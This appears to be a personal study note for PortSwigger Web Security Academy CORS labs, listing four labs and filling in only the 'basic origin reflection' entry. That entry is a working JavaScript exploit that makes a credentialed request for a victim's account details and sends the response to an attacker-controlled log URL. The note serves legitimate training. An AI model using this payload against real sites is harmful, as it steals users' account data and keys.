| #   | Lab Name                                              | Level        | Repeat | Link |
| --- | ----------------------------------------------------- | ------------ | ------ | ---- |
| 1   | CORS vulnerability with basic origin reflection       | APPRENTICE   |        | [click here](#cors-vulnerability-with-basic-origin-reflection)     |
| 2   | CORS vulnerability with trusted null origin           | APPRENTICE   |        |      |
| 3   | CORS vulnerability with trusted insecure protocols    | PRACTITIONER |        |      |
| 4   | CORS vulnerability with internal network pivot attack | EXPERT       |        |      |

## CORS vulnerability with basic origin reflection

title: CORS vulnerability with basic origin reflection
description: 
exploitation: 
```html
<script>
	var req = new XMLHttpRequest(); 
	req.onload = reqListener; 
	req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true); 
	req.withCredentials = true; req.send(); 
	function reqListener() { 
		location='/log?key='+this.responseText; 
	};
</script>
```
references: 